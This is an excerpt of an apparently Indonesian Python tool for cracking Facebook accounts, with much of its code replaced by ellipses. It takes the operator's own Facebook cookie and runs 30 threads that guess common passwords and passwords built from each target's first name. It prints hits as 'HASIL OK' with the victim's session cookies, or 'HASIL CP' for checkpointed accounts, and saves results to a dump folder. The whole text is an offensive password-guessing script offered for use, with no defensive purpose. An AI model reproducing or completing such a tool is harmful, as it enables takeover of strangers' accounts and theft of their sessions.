...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{h}•{x}] Masukkan Cookies Facebook :{asu} ')
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL......ketik lagi   python nana.py  (enter)!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK AKUN LUU NGAB !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def setting():
	...
	if hu in ['1','01']:
		...
		exit()
	print(f'{m}  ———————>{x}{h} PILIH METHODE CRACK {x}{m}<———————{x}') 
	print('')	
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['sayang','katasandi','bismillah','anjing']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}HASIL CP —>{k} {idf}|{pw}{N}')     
				...
				if 'no' in taplikasi:
					...
					print(f'\r{x}HASIL OK —> {hh}{idf}|{pw}|{kuki}{N}')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				for muncul in apkexp:
					hit+=1
					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
				print(f'\r{x}HASIL OK —> {hh}{idf}|{pw}|{kuki}\n{ua}\n{infoakun}{x}')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green] [/bold green]'))
					ok+=1
					break
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/IKIWZ-DUMP')
	except:pass
